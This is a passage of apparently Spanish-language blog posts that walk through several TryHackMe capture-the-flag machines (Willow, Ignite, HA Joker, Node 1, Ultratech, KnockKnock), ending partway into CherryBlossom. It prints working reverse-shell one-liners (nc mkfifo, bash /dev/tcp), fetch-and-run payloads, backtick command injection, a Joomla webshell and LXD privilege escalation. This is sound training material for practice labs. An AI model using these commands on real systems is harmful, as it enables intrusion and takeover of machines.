4  root@aoiri:~/tryhackme/new_rom# gobuster dir -u http://willow.thm/ -w /usr/share/wordlists/dirb/common_nofirst10.txt -q -t 25 -x php,html,txt /index.html (Status: 200) /index.html (Status: 200) /server-status (Status: 403)   USER - Willow PRIVATE KEY En la pagina principal de willow encontramos una cadena en hexadecimal.\nUtilizamos CyberChef para decodificar el contenido de esta cadena.\nÈncontramos un mensaje en el que indica que la clave privada de Willow esta encriptada - Asumimos que willow es un usuario registrado en la maquina:\nHey Willow, here's your SSH Private key -- you know where the decryption key is! Adjunto al mensaje, una lista de numeros.\nNFS En el puerto 2049 encontramos un punto de montaje el cual puede utilizar cualquiera (nobody:nogroup), utilizamos mount para montar la carpeta permitida (/var/failsafe).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  root@aoiri:~/tryhackme/willow# showmount -e willow.thm Export list for willow.thm: /var/failsafe * root@aoiri:~/tryhackme/willow# mkdir tmp_nfs root@aoiri:~/tryhackme/willow# pwd /root/tryhackme/willow root@aoiri:~/tryhackme/willow# mount -t nfs willow.thm:/var/failsafe /root/tryhackme/willow/tmp_nfs/ root@aoiri:~/tryhackme/willow# ls tmp_nfs/ rsa_keys root@aoiri:~/tryhackme/willow# cd tmp_nfs/ root@aoiri:~/tryhackme/willow/tmp_nfs# cat rsa_keys Public Key Pair: (23, *****) Private Key Pair: (*****, *****) root@aoiri:~/tryhackme/willow/tmp_nfs# ls -lah total 12K drwxr--r-- 2 nobody nogroup 4.0K Jan 30 10:31 . drwxr-xr-x 3 root root 4.0K Feb 28 14:05 .. -rw-r--r-- 1 root root 62 Jan 30 10:31 rsa_keys root@aoiri:~/tryhackme/willow/tmp_nfs#   El contenido del archivo que encontramos en la carpeta es rsa_keys que contiene las claves para la clave publica y la clave privada.\n1 2 3  root@aoiri:~/tryhackme/willow/tmp_nfs# cat rsa_keys Public Key Pair: (23, *****) Private Key Pair: (*****, *****)   En este post RSA Encription explica a la perfeccion como funcionan, encriptacion y desencriptacion de RSA. Para este reto escribi un pequeño script en python que por cada numero que encontramos en el mensaje, lo vamos a convertir a hexadecimal utilizando las claves (6\u0026mdash;7, 3\u0026mdash;7) del archivo rsa_keys, en este caso vamos a utilizar el de la clave privada para poder conectarnos atraves del servicio SSH. Una vez hecho lo anterior convertimos a texto el mensaje (lista) en hexadecimal que obtuvimos.\nEjecutamos nuestro script y obtenemos nuestra clave privada:\nUtilizamos la clave para iniciar sesion en el servicio de SSH pero esta esta protegida por una frase.\nUtilizamos John para obtener el hash de la clave y obtener la frase.\nUna vez con la frase de nuestro archivo, iniciamos sesion en el servicio SSH y obtenemos nuestra shell con usuario Willow.\nEncontramos una imagen en la carpeta principal de Willow:\nLa codificamos a base64 y utilizamos nuevamente CyberChef para renderizar nuestra imagen (podemos utilizar scp btw), obtenemos nuestra flag user.txt:\nPRIVILEGE ESCALATION Enumeramos los comandos que podemos ejecutar sin contraseña utilizando sudo sudo -l -l y vemos que podemos utilizar mount.\nRevisamos /mnt/ y encontramos la carpeta /creds que no contiene nada.\nVemos el contenido de /dev en donde se supone estan las \u0026ldquo;particiones\u0026rdquo; montadas, y podemos ver inmediatamente hidden_backup lo cual no es muy comun de encontrar.\nYa que podemos utilizar mount con sudo vamos a proceder a montar esta \u0026ldquo;particion\u0026rdquo; en /mnt/creds (puede ser en cualquier otra carpeta a la que willow tenga acceso).\nEncontramos las credenciales del usuario root y willow, cambiamos al usuario root y dentro de su carpeta encontramos un mensaje en root.txt.\nLa nota nos indica que la flag root.txt ya nos fue dada antes de que obtuvieramos una shell, recordemos que la primera flag la encontramos en la imagen, regresamos a la imagen que encontramos y extraemos su contenido con la contraseña de root, en donde podemos ver nuestra ultima flag.\n","description":"","id":41,"section":"posts","tags":["linux"],"title":"TryHackMe - Willow","uri":"https://sckull.github.io/posts/willow/"},{"content":"Ignite es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo Ignite     Info A new start-up has a few issues with their web server.   Puntos 600   Dificultad Facil   Maker DarkStar7471    NMAP Escaneo de puerto tcp, en el cual nos muestra varios puertos abiertos.\n1 2 3 4 5 6 7 8 9  # Nmap 7.80 scan initiated Mon Mar 2 17:50:06 2020 as: nmap -sV -p- --min-rate=1000 -o nmap_rate 10.10.169.161 Nmap scan report for 10.10.169.161 Host is up (0.20s latency). Not shown: 65534 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Mar 2 17:51:40 2020 -- 1 IP address (1 host up) scanned in 94.48 seconds   GOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11  root@aoiri:~/tryhackme/ignite# gobuster dir -u ignite.thm -w /usr/share/wordlists/dirb/common_nofirst10.txt -q -t 15 -x php,html,txt /0 (Status: 200) /assets (Status: 301) /home (Status: 200) /index (Status: 200) /index.php (Status: 200) /index.php (Status: 200) /offline (Status: 200) /robots.txt (Status: 200) /robots.txt (Status: 200) /server-status (Status: 403)   HTTP Pagina en el puerto 80, en esta nos muestra los pasos que se deben de seguir para instalar el Fuel CMS.\nEn una de las instrucciones nos muestra las credenciales para ingresar en el dashboard de este CMS.\nEntramos en el CMS con las credenciales.\nRCE Fuel CMS 1.4.1 Buscamos un exploit para este CMS encontramos uno para ejecutar comandos, este exploit necesita burpsuite para poder funcionar en el puerto 8080 aunque no es necesario. Ejecutamos un comando y vemos los archivos del sistema.\nFuel CMS 1.4.1\nCreamos un archivo bash en el que contiene nuestra shell inversa, descargamos y ejecutamos nuestra shell.\nExploit:\n1  cmd:wget 10.8.1.72/shell.sh \u0026amp;\u0026amp; bash shell.sh   Obtenemos una shell inversa con el usuario www-data.\nEncontramos nuestra flag user.txt en la carpeta /home.\nPRIVILEGE ESCALATION Enumeramos los archivos en la maquina, en los archivos del CMS encontramos las credenciales de la base de datos.\nUtilizamos su con la contraseña de root y obtenemos una shell y nuestra flag root.txt.\n","description":"","id":42,"section":"posts","tags":["linux"],"title":"TryHackMe - Ignite","uri":"https://sckull.github.io/posts/ignite/"},{"content":"HA Joker CTF es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo HA Joker CTF     Info Batman hits Joker.   Puntos 3940   Dificultad Media   Maker ki11switch    NMAP Escaneo de puerto tcp, en el cual nos muestra varios puertos abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13  # Nmap 7.80 scan initiated Thu Feb 27 14:33:03 2020 as: nmap -sV -p- --min-rate=1000 -o nmap_rate jokerctf.thm Warning: 10.10.171.105 giving up on port because retransmission cap hit (10). Nmap scan report for jokerctf.thm (10.10.171.105) Host is up (0.24s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) 8080/tcp open http Apache httpd 2.4.29 Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Feb 27 14:34:50 2020 -- 1 IP address (1 host up) scanned in 107.72 seconds   HTTP En el puerto 80 encontramos una pagina que nos muestra distintas imagenes del joker.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10  root@aoiri:~/tryhackme/jokerctf# gobuster dir -u http://jokerctf.thm/ -w /usr/share/wordlists/dirb/common_nofirst10.txt -q -t 15 -x php,html,txt /css (Status: 301) /img (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /phpinfo.php (Status: 200) /phpinfo.php (Status: 200) /secret.txt (Status: 200) /server-status (Status: 403) root@aoiri:~/tryhackme/jokerctf#   /secret.txt HTTP - Puerto 8080 En el puerto 8080 encontramos un panel donde nos pide un usuario y contraseña.\nHydra Utilizamos hydra con los usuarios joker y batman junto con el wordlist rockyou.txt en el puerto 8080.\nAl iniciar sesion con las credenciales vemos una nueva pagina, a simple vista podemos ver que es un CMS Joomla.\nRUSTBUSTER Utilizamos RUSTBUSTER para busqueda de directorios y archivos (por alguna razon gobuster no aceptaba los headers).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65  root@aoiri:~/tryhackme/jokerctf# /opt/rustbuster/rustbuster dir -u http://jokerctf.thm:8080/ -w /usr/share/wordlists/dirb/common_nofirst10.txt -t 25 -e php,html,txt -H \u0026#34;Authorization: Basic am9rZXI6aGFubmFo,Cookie: 5fef75b50575ebea33a28bd1e7087dcb=et845u1qtnkv5io3ak6msfmdim; 0d073d2ec68ac2f24f859831bbe8843b=3r1udjnnh7dk8bv4jt7gpadh5r\u0026#34; ~ rustbuster v3.0.3 ~ by phra \u0026amp; ps1dr3x ~tarted at\t: 2020-02-27 16:01:01 GET\t403 Forbidden\thttp://jokerctf.thm:8080/.html GET 403 Forbidden http://jokerctf.thm:8080/.php GET 200 OK http://jokerctf.thm:8080/ GET 301 Moved Permanently http://jokerctf.thm:8080/administrator =\u0026gt; http://jokerctf.thm/administrator/ GET 200 OK http://jokerctf.thm:8080/backup GET 200 OK http://jokerctf.thm:8080/backup.zip GET 301 Moved Permanently http://jokerctf.thm:8080/bin =\u0026gt; http://jokerctf.thm/bin/ GET 301 Moved Permanently http://jokerctf.thm:8080/cache =\u0026gt; http://jokerctf.thm/cache/ GET 301 Moved Permanently http://jokerctf.thm:8080/components =\u0026gt; http://jokerctf.thm/components/ GET 200 OK http://jokerctf.thm:8080/configuration.php GET 301 Moved Permanently http://jokerctf.thm:8080/images =\u0026gt; http://jokerctf.thm/images/ GET 301 Moved Permanently http://jokerctf.thm:8080/includes =\u0026gt; http://jokerctf.thm/includes/ GET 200 OK http://jokerctf.thm:8080/index.php GET 200 OK http://jokerctf.thm:8080/index.php GET 301 Moved Permanently http://jokerctf.thm:8080/language =\u0026gt; http://jokerctf.thm/language/ GET 301 Moved Permanently http://jokerctf.thm:8080/layouts =\u0026gt; http://jokerctf.thm/layouts/ GET 301 Moved Permanently http://jokerctf.thm:8080/libraries =\u0026gt; http://jokerctf.thm/libraries/ GET 200 OK http://jokerctf.thm:8080/LICENSE GET 200 OK http://jokerctf.thm:8080/LICENSE.txt GET 301 Moved Permanently http://jokerctf.thm:8080/media =\u0026gt; http://jokerctf.thm/media/ GET 301 Moved Permanently http://jokerctf.thm:8080/modules =\u0026gt; http://jokerctf.thm/modules/ GET 301 Moved Permanently http://jokerctf.thm:8080/plugins =\u0026gt; http://jokerctf.thm/plugins/ GET 200 OK http://jokerctf.thm:8080/README GET 200 OK http://jokerctf.thm:8080/README.txt GET 200 OK http://jokerctf.thm:8080/robots GET 200 OK http://jokerctf.thm:8080/robots.txt GET 200 OK http://jokerctf.thm:8080/robots.txt GET 403 Forbidden http://jokerctf.thm:8080/server-status GET 301 Moved Permanently http://jokerctf.thm:8080/templates =\u0026gt; http://jokerctf.thm/templates/ GET 301 Moved Permanently http://jokerctf.thm:8080/tmp =\u0026gt; http://jokerctf.thm/tmp/ GET 200 OK http://jokerctf.thm:8080/web.config GET 200 OK http://jokerctf.thm:8080/web.config.txt [?] Ended at: 2020-02-27 16:05:02   USER - www-data Encontramos un archivo backup.zip en la pagina protegido por contraseña, utilizamos la contraseña de joker que encontramos con hydra.\n1 2 3 4 5 6 7  root@aoiri:~/tryhackme/jokerctf# file backup.zip backup.zip: Zip archive data, at least v1.0 to extract root@aoiri:~/tryhackme/jokerctf# unzip backup.zip Archive: backup.zip creating: db/ [backup.zip] db/joomladb.sql password: skipping: db/joomladb.sql incorrect password   Encontramos un archivo de base de datos, dentro de los querys encontramos un insert en el que aparece la contraseña del usuario admin:\nCrackeamos la contraseña con john:\n1 2 3 4 5 6 7 8 9 10 11  root@aoiri:~/tryhackme/jokerctf# john hash_joomla --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3]) Cost 1 (iteration count) is 1024 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status ****** (?) 1g 0:00:00:12 DONE (2020-02-27 16:14) 0.08130g/s 83.41p/s 83.41c/s 83.41C/s bullshit..bulldogs Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed root@aoiri:~/tryhackme/jokerctf#   Ahora podemos iniciar sesion en el panel de joomla, vamos a crear un archivo el cual ejecute comandos en el sistema. Nos dirigimos a Extensions -\u0026gt; Templates, Seleccionamos protostar el cual esta siendo utilizado en la pagina de joomla.\nCreamos un archivo en el template protostar.\nEjecutamos comandos utilizando la URL http://jokerctf.thm:8080/templates/protostar/shell.php?cmd=id.\nObtenemos una shell utilizando nuestra shell, creamos un archivo shell.sh el cual contiene una shell inversa, la descargamos en la maquina y la ejecutamos.\nObtenemos una shell con el usuario www-data.\nPRIVILEGE ESCALATION Vemos que el usuario www-data pertenece al grupo lxc, logramos listar las images que estan disponibles en la maquina.\nUtilizamos lxc para poder crear un contenedor y montar la carpeta /root en /mnt/root:\nLXD Alpine Builder\nLXD - Privilege Escalation\nComandos:\n1 2 3 4 5 6 7 8  #Descargamos alpine en la maquina en la carpeta /tmp lxc image import ./alpine-v3.11-x86_64-20200227_1750.tar.gz --alias myimage lxc image list lxc init myimage ignite -c security.privileged=true lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true lxc start ignite lxc exec ignite /bin/sh   Logramos obtener una shell cn el usuario root y nuestra flag \u0026ldquo;root.txt\u0026rdquo;.\n","description":"","id":43,"section":"posts","tags":["linux"],"title":"TryHackMe - HA Joker CTF","uri":"https://sckull.github.io/posts/jokerctf/"},{"content":"Node 1 es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo Node 1     Info Node is a medium level boot2root challenge, originally created for HackTheBox.   Puntos 617   Dificultad Media   Maker coderj    NMAP Escaneo de puerto tcp, en el cual nos muestra varios puertos abiertos.\n1 2 3 4 5 6 7 8 9 10 11  # Nmap 7.80 scan initiated Wed Feb 26 23:37:37 2020 as: nmap -p- -T4 -sV -o nmap_scan 10.10.27.51 Nmap scan report for 10.10.27.51 Host is up (0.22s latency). Not shown: 65533 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) 3000/tcp open http Node.js Express framework Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Feb 26 23:43:56 2020 -- 1 IP address (1 host up) scanned in 378.90 seconds   HTTP - Puerto 3000 En el puerto 3000 encontramos una pagina que nos muestra tres usuarios.\nAl analizar el codigo fuente de la pagina nos encontramos con los controladores de la pagina.\nEn el controlador de home.js encontramos una ruta de una api a la que hace una solicitud.\nHacemos una consulta a la ruta y nos devuelve tres usuarios, contraseñas encriptadas y que los usuarios no son administradores:\nUtilizamos crackstation.net para crackear las contraseñas, solo obtuvimos la contraseña de los primeros dos usuarios:\nEn el controlador profile.js encontramos que existe otra ruta en la que se hacen consultas de un usuario especifico pero al hacer una consulta sin un usuario nos muestra nuevamente la lista de usuarios con su contraseña, pero en esta respuesta nos aparece un usuario nuevo el cual es administrador:\nHash crackeada:\nUtilizamos las credenciales del usuario nuevo y nos redirige a una pagina nueva en la que podemos descargar un archivo:\nEl archivo contiene una cadena codificada en base64, al decodificarla vemos que es un archivo zip, pero este esta protegido por contraseña:\nUtilizamos fcrackzip para hacer un ataque de fuerza bruta:\nUSER - mark Al descomprimir el archivo zip encontramos que, es un backup de la ruta donde se encuentran los archivos de la pagina (/var/html/myplace/). Vemos la contraseña de la conexion de mongodb con el usuario mark, utilizamos estas credenciales para iniciar sesion en el servicio SSH.\nObtenemos una shell con el usuario mark.\nUSER - tom En la carpeta /var/scheduler encontramos una aplicacion la cual contiene una base de datos distinta, y la cual se ejecuta cada 30 segundos, ademas de eso vemos entre los procesos en ejecucion que esta aplicacion la esta ejecutando el usuario tom. La aplicacion realiza una iteracion en la tabla tasks y la ejecuta, luego la elimina.\nInsertamos una shell inversa en la tabla tasks (coleccion):\n1  db.tasks.insert({ \u0026#34;cmd\u0026#34;: \u0026#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.8.1.72 1338 \u0026gt;/tmp/f\u0026#34; });   Despues de 30 segundos se ejecuta nuestra shell inversa y obtenemos una shell con el usuario tom y nuestra flag user.txt.\nPRIVILEGE ESCALATION Vemos la version del kernel y buscamos la misma en searchsploit, vemos que existe un exploit que nos puede ayudar a escalar privilegios.\nCVE-2017-16995\nLo compilamos, descargamos en la maquina, le damos permisos de ejecucion, lo ejecutamos y obtenemos una shell con usuario root y nuestra flag root.txt.\n","description":"","id":44,"section":"posts","tags":["linux"],"title":"TryHackMe - Node 1","uri":"https://sckull.github.io/posts/nodeone/"},{"content":"Ultratech es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo Ultratech     Info The basics of Penetration Testing, Enumeration, Privilege Escalation and WebApp testing   Puntos 2018   Dificultad Media   Maker lp1    NMAP Escaneo de puerto tcp, en el cual nos muestra varios puertos abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13  # Nmap 7.80 scan initiated Tue Feb 25 22:11:48 2020 as: nmap -p- -T4 -sV -o nmap_scan 10.10.223.47 Nmap scan report for 10.10.223.47 Host is up (0.18s latency). Not shown: 65531 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 8081/tcp open http Node.js Express framework 31331/tcp open http Apache httpd 2.4.29 ((Ubuntu)) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Feb 25 22:36:00 2020 -- 1 IP address (1 host up) scanned in 1451.43 seconds   WFUZZ - Puerto 8081 Utilizamos WFUZZ para encontrar directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  root@aoiri:~/tryhackme/ultratech# wfuzz -w /usr/share/wordlists/dirb/common_nofirst10.txt -u http://10.10.223.47:8081/FUZZ --sc 200 Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 2.4 - The Web Fuzzer * ******************************************************** Target: http://10.10.223.47:8081/FUZZ Total requests: 4586 =================================================================== ID Response Lines Word Chars Payload =================================================================== 000000001: 200 0 L 3 W 20 Ch \u0026#34;\u0026#34; 000000487: 200 0 L 8 W 39 Ch \u0026#34;auth\u0026#34; Total time: 429.3228 Processed Requests: 4586 Filtered Requests: 4584 Requests/sec.: 10.68193   GOBUSTER - Puerto 31331 Ya que en este puerto esta corriendo el servicio de APACHE utilizamos gobuster para encontrar directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  root@aoiri:~/tryhackme/ultratech# gobuster dir -u http://10.10.223.47:31331 -w /usr/share/wordlists/dirb/common_nofirst10.txt -t 15 -x php,html,txt -q /css (Status: 301) /favicon.ico (Status: 200) /images (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /javascript (Status: 301) /js (Status: 301) /partners.html (Status: 200) /robots.txt (Status: 200) /robots.txt (Status: 200) /server-status (Status: 403) /what.html (Status: 200) root@aoiri:~/tryhackme/ultratech#   WWW - Shell Enumeramos las paginas que encontramos en el puerto 31331 y al visitar partners.html encontramos una panel de inicio de sesion.\nAnalizamos el codigo fuente y encontramos un archivo de javascript en el que nos muestra una ruta nueva con su parametro de la API que esta corriendo en el servicio de Node.js en el puerto 8081.\nEn el parametro ingresamos nuestra IP, y ejecutamos tcpdump para capturar paquetes ICMP.\nVemos que la maquina nos hace ping. Utilizamos \u0026ldquo;Command Injection\u0026rdquo; para poder ejecutar comandos, utilizamos ` (acento grave | codigo ascii 96) para \u0026ldquo;escapar\u0026rdquo; la ejecucion del comando ping. Creamos un archivo bash en el que escribimos nuestra shell inversa, en la ruta de la API ejecutamos comandos para: descargar el archivo y ejecutar el archivo.\nshell.sh:\n1  bash -i \u0026gt;\u0026amp; /dev/tcp/10.8.1.72/4242 0\u0026gt;\u0026amp;1   Commandos:\n1 2 3 4 5  #Primer comando wget 10.8.1.72/shell.sh -o shell.sh #Segundo Comando bash shell.sh   Ejecutamos los comandos como parametro en la URL:\nview-source:http://10.10.223.47:8081/ping?ip=`wget 10.8.1.72/shell.sh -o shell.sh` view-source:http://10.10.223.47:8081/ping?ip=`bash shell.sh` Una vez hecho esto, logramos obtener una shell con el usuario www:\nCommand Injection\nUSER - r00t Dentro de los archivos de la maquina encontramos una base de datos, la pasamos a nuestra maquina para poder ver los datos que tiene.\nEn la base de datos encontramos la tabla de \u0026lsquo;users\u0026rsquo; en donde encontramos dos usuarios y su contraseña encriptada:\nUtilizamos crackstation para crackear las hashes:\nVemos que los usuarios registrados en la maquina aparece r00t utilizamos la contraseña crackeada y logramos obtener una shell con este usuario.\nFTP-SSH De igual forma con las credenciales de r00t podemos ingresar al servicio de FTP y SSH.\nPRIVILEGE ESCALATION Una pequeña enumeracion basta para poder tener la idea de lo que debemos de hacer, en este caso encontramos que el usuario r00t pertenece al grupo de docker. Utilizamos docker para obtener una shell con el usuario root.\nDocker GTFOBINS\n","description":"","id":45,"section":"posts","tags":["linux"],"title":"TryHackMe - Ultratech","uri":"https://sckull.github.io/posts/ultratech/"},{"content":"KnockKnock es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo KnockKnock     Info Knock knock, who\u0026rsquo;s there? Pcaps \u0026amp; port knocking   Puntos 3100   Dificultad Media   Maker ben    NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80) abierto.\n1 2 3 4 5 6 7 8 9 10 11 12  # Nmap 7.80 scan initiated Mon Feb 24 16:44:16 2020 as: nmap -p- -T4 -sV -sC -o nmap_scan 10.10.220.35 Warning: 10.10.220.35 giving up on port because retransmission cap hit (6). Nmap scan report for 10.10.220.35 Host is up (0.15s latency). Not shown: 65534 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) |_http-server-header: Apache/2.4.7 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Feb 24 17:02:22 2020 -- 1 IP address (1 host up) scanned in 1085.70 seconds   En la pagina principal nos muestra un mensaje junto con un enlace que nos redirige hacia un archivo PCAP.\nKnock Vemos que la IP (192.168.56.102) esta realizando solicitudes a la IP2 (192.168.56.101) utilizando los puertos 7000, 8000, 9000, 7000, 8000, 9000, 8888. Utilizamos knockd utilizando los puertos que encontramos y realizamos un escaneo de puertos con nmap.\n1 2 3 4 5 6 7 8 9 10 11  root@aoiri:~/tryhackme/knockknock# knock 10.10.220.35 7000 8000 9000 7000 8000 9000 8888 \u0026amp;\u0026amp; nmap 10.10.220.35 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-24 17:11 CST Nmap scan report for 10.10.220.35 Host is up (0.25s latency). Not shown: 998 closed ports PORT STATE SERVICE 80/tcp open http 8888/tcp open sun-answerbook Nmap done: 1 IP address (1 host up) scanned in 17.61 seconds root@aoiri:~/tryhackme/knockknock#   Visitamos la IP con el puerto 8888 y encontramos una nueva direccion de la pagina.\nEn la direccion encontramos nuevamente un archivo PCAP:\nAl analizar el archivo PCAP encontramos una solicitud en la que se muestra una imagen en ASCII con un mensaje:\nEl mensaje esta en aleman por lo que utilizamos google para traducir el mensaje:\nMensaje:\n1 3 3 7 Utilizamos los puerto 1, 3, 3 y 7 con knock, y utilizamos nmap para escanear el puerto 1337:\n1 2 3 4 5 6 7 8 9  root@aoiri:~/tryhackme/knockknock# knock 10.10.220.35 1 3 3 7 \u0026amp;\u0026amp; nmap -p1337 10.10.220.35 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-24 17:31 CST Nmap scan report for 10.10.220.35 Host is up (0.16s latency). PORT STATE SERVICE 1337/tcp open waste Nmap done: 1 IP address (1 host up) scanned in 0.53 seconds   Visitamos el puerto y encontramos una nueva direccion:\nEncontramos en la direccion un string en base64:\nAl traducirlo encontramos varios puertos que indican que es para el servicio SSH:\n1 2 3  root@aoiri:~/tryhackme/knockknock# echo T3BlbiB1cCBTU0g6IDg4ODggOTk5OSA3Nzc3IDY2NjYK | base64 -d Open up SSH: 8888 9999 7777 6666 root@aoiri:~/tryhackme/knockknock#   Utilizamos los puertos con knock y analizamos nuevamente la IP con nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  root@aoiri:~/tryhackme/knockknock# knock 10.10.220.35 8888 9999 7777 6666 \u0026amp;\u0026amp; nmap -sV -sC 10.10.220.35 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-24 17:35 CST Nmap scan report for 10.10.220.35 Host is up (0.16s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 8d:1f:97:c6:4d:e9:1d:2b:5d:b8:6e:64:66:bb:48:2b (DSA) | 2048 02:31:1c:77:aa:c1:f6:2b:d3:09:f6:e0:63:fe:a9:37 (RSA) | 256 fe:16:33:a4:4d:7f:3d:db:b6:11:d4:b8:c1:32:b6:79 (ECDSA) |_ 256 cc:5c:76:be:e8:93:b8:55:ef:e8:a3:bd:64:76:2d:75 (ED25519) 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) |_http-title: Site doesn\u0026#39;t have a title (text/html). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 42.73 seconds   Vemos que el servicio SSH esta abierto en el puerto 22, intentamos conectarnos al puerto 22 sin ningun usuario y al conectarnos nos muestra un mensaje donde nos muestra el usuario y su contraseña:\nIntentamos conectarnos con las credenciales pero nos cierra la sesion rapidamente, ademas de eso nos muestra un mensaje en el que nos indica que tenemos un segundo de conexion.\nUtilizamos el parametro -f para poder ejecutar comandos al conectarnos en el servicio, vemos que el comando ls -lah se ejecuta:\nEjecutamos una shell inversa:\n1 2 3 4 5 6 7 8  root@aoiri:~/tryhackme/knockknock# knock 10.10.108.150 8888 9999 7777 6666 \u0026amp;\u0026amp; ssh butthead@10.10.108.150 -f \u0026#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.8.1.72 1338 \u0026gt;/tmp/f\u0026#39; ############################################ # CONGRATS! YOU HAVE OPENED THE SSH SERVER # # USERNAME: butthead # # PASSWORD: ********** # ############################################ butthead@10.10.108.150\u0026#39;s password: root@aoiri:~/tryhackme/knockknock#   Y obtenemos shell con el usuario butthead.\nPRIVILEGE ESCALATION Enumeramos la maquina en busqueda de aplicaciones, archivos, directorios vulnerables. Encontramos que el kernel de esta maquina en su version 3.13.0-46-generic es vulnerable. Descargamos el exploit en la maquina, lo compilamos y ejecutamos el exploit, obtenemos una shell con usuario root.\n","description":"","id":46,"section":"posts","tags":["linux"],"title":"TryHackMe - KnockKnock","uri":"https://sckull.github.io/posts/knockknock/"},{"content":"CherryBlossom es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo CherryBlossom     Info Boot-to-root with emphasis on crypto and password cracking.   Puntos 1450   Dificultad Dificil   Maker MuirlandOracle    NMAP Escaneo de puertos tcp, nmap nos muestra el puerto smb (445), ldap (139) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12  # Nmap 7.80 scan initiated Fri Feb 21 18:25:06 2020 as: nmap -p- -sV -o nmap_scan 10.10.214.121 Nmap scan report for 10.10.214.121 Host is up (0.28s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) Service Info: Host: UBUNTU; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Feb 21 18:43:37 2020 -- 1 IP address (1 host up) scanned in 1111.32 seconds   USER Enum4linux Utilizamos esta herramienta para obtener informacion del servicio de SAMBA y LDAP.\nStarting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Feb 21 18:28:18 2020 ========================== | Target Information | ========================== Target ........... 10.10.214.121 RID Range ........ 500-550,1000-1050 Username ......... '' Password ......... '' Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none ===================================================== | Enumerating Workgroup/Domain on 10.10.214.121 | ===================================================== [+] Got domain/workgroup name: WORKGROUP ============================================= | Nbtstat Information for 10.10.214.121 | ============================================= Looking up status of 